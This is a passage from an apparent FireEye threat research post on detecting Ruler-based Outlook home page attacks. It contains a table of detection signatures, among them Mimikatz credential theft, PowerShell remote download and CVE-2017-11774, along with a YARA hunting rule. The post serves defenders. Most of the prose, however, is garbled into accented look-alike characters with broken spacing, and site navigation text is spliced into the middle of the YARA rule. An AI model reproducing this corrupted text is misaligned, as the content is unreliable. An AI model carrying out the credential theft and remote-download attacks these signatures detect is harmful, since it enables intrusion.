ŘŲĿĚŘ.ĦǾMĚPǺĢĚ\nȚǻbŀě 3: Ǿųțŀǿǿķ ǻțțǻčķ șųřfǻčě mįțįģǻțįǿň ș\nĐěțěčțįňģ țħě Țěčħňįq ųěș\nFįřěĚỳě đěțěčțěđ țħįș ǻčțįvįțỳ ǻč řǿșș ǿųř pŀǻțfǿřm, įňčŀųđįňģ ňǻmě đ đěțěčțįǿň fǿ ř PǾȘĦČ2, PŲPỲŘǺȚ, ǻň đ\nPǾẄĚŘȚǾŇ. Țǻbŀě 4 čǿňțǻįň ș șěvěřǻŀ șpěčįfįč đěțěčțįǿň ňǻmě ș țħǻț ǻppŀįě đ țǿ țħě ěmǻįŀ ěxpŀǿįțǻțįǿň ǻň đ įňįțįǻŀ\nįňfěčțįǿň ǻčțįvįțỳ.\nPĿǺȚFǾŘM ȘİĢŇǺȚŲŘĚ ŇǺMĚ\nĚňđpǿįňț Șěč ųřįțỳPǾẄĚŘȘĦĚĿĿ ĚŇČǾĐĚĐ ŘĚMǾȚĚ ĐǾẄŇĿǾǺĐ (M ĚȚĦǾĐǾĿǾĢỲ)\nȘŲȘPİČİǾŲȘ PǾẄ ĚŘȘĦĚĿĿ ŲȘǺĢ Ě (MĚȚĦǾĐǾĿǾĢỲ)\nMİMİĶǺȚŻ (ČŘ ĚĐĚŇȚİǺĿ ȘȚĚǺĿĚŘ)\nŘŲĿĚŘ ǾŲȚĿǾǾĶ P ĚŘȘİȘȚĚŇČĚ (ŲȚİĿİȚỲ)\nŇěțẅǿřķ ǻňđ\nĚmǻįŀ Șěč ųřįțỳFĚ_Ěxpŀǿįț_ĦȚMĿ_ČV Ě201 711774\nFĚ_ĦǻčķȚǿǿŀ_Ẅįň_ŘŲĿ ĚŘ\nFĚ_ĦǻčķȚǿǿŀ_Ŀįň ųx_ŘŲĿĚŘ\nFĚ_ĦǻčķȚǿǿŀ_ǾȘX_ŘŲĿ ĚŘ\nFĚ_Țřǿjǻň_ǾĿ Ě_ŘŲĿĚŘ\nĦǻčķȚǿǿŀ.ŘŲĿ ĚŘ (Ňěțẅǿřķ Țřǻffįč)\nȚǻbŀě 4: Fį řěĚỳě přǿđųčț đěțěčțįǿň ș\nFǿř ǿřģǻňįżǻțįǿňș įňțěřěșțěđ įň ħųňțįňģ fǿ ř Ǿųțŀǿǿķ ħǿmě pǻģě șħěŀŀ ǻňđ pěřșįșțěňčě, ẅě’vě įňčŀ ųđěđ ǻ Ỳǻřǻ řųŀě\nțħǻț čǻň ǻŀ șǿ bě ųșěđ fǿř čǿňțěxț țǿ đįffěřěňțįǻțě țħě șě pǻỳŀǿǻ đș fřǿm ǿțħě ř șčřįpțș:\nrule Hunting_Outlook_Homepage_Shell_and_Persistence\n{\nmeta:\n        author = \"Nick Carr (@itsreallynick)\"\n        reference_hash = \"506fe019d48ff23fac8ae3b6dd754f6e\"\n  PŘĚVİǾŲȘ PǾȘȚ ŇĚXȚ PǾȘȚ    strings:\n        $script_1 = \"<htm\" ascii nocase wide\n        $script_2 = \"<script\" ascii nocase wide\n        $viewctl1_a = \"ViewCtl1\" ascii nocase wide\n        $viewctl1_b = \"0006F063-0000-0000-C000-000000000046\" ascii wide\n        $viewctl1_c = \".OutlookApplication\" ascii nocase wide\n    condition:\n        uint16(0) != 0x5A4D and all of ($script*) and any of ($viewctl1*)\n}\nǺčķňǿẅŀěđģěměňț ș\nȚħě ǻųțħǿřș ẅǿųŀđ ŀįķě țǿ țħǻňķ Mǻțț Bě řňįňģěř fǿř přǿvįđįňģ đǻțǻ șčįěňčě șųppǿřț fǿř ǻțțřįbųțįǿň ǻųģměňțǻțįǿň\npřǿjěčțș, Ǿmǻř Șǻřđǻř (FĿǺŘ Ě) fǿř řěvěřșě ěňģįňěě řįňģ PǾẄ ĚŘȚǾŇ, ǻňđ Jǿșěpħ Řěỳě ș (FįřěĚỳě Ŀǻbș) fǿř\nčǿňțįňųěđ čǿmpřěħěňșįvě Ǿųțŀǿǿķ čŀįěňț ěxpŀǿįțǻțįǿň p řǿđųčț čǿvě řǻģě.\n \nČǿmpǻňỳ\nẄħỳ Fį řěĚỳě?\nČųșțǿměř Șțǿřįěș\nČǻřěěřș\nČěřțįfįčǻțįǿň ș ǻňđ Čǿmpŀįǻňčě\nİňvěșțǿř Řěŀǻțįǿň ș\nȘųppŀįěř Đǿčųměňțș\nŇěẅș ǻňđ Ěvěňțș\nŇěẅșřǿǿm\nPřěșș Řěŀěǻșěș\nẄěbįňǻ řș\nĚvěňțș\nǺẅǻřđș ǻňđ Ħǿňǿřș\nĚmǻįŀ Přěfěřěňčěș\nȚěčħňįčǻŀ Ș ųppǿřț\nİňčįđěňț?\nŘěpǿřț Șěčųřįțỳ İșșųě\nČǿňțǻčț Ș ųppǿřț\nČųșțǿměř Pǿřțǻŀ\nČǿmmųňįțįěș\nĐǿčųměňțǻțįǿň Pǿ řțǻŀ\nFįřěĚỳě Bŀǿģ ș\nȚħřěǻț Řěșěǻřčħ\nFįřěĚỳě Șțǿřįěș\nİňđųșțřỳ Pěřșpěčțįvě ș\nȚħřěǻț Mǻp\nVįěẅ țħě Ŀǻțě șț Țħřěǻțș\nČǿňțǻčț Ų ș\n+1 877-347-3393\n \nȘțǻỳ Čǿňňěčțě đ\n\nČǿpỳřįģħț © 2020  FįřěĚỳě, İňč. Ǻŀŀ řįģħțș řěșěřvěđ. \nPřįvǻčỳ & Čǿǿķįě ș Pǿŀįčỳ  | Přįvǻčỳ Șħįěŀ đ | Ŀěģǻŀ Đǿč ųměňțǻțįǿňȘįțě Ŀǻňģ ųǻģě\nĚňģŀįșħ\n "
}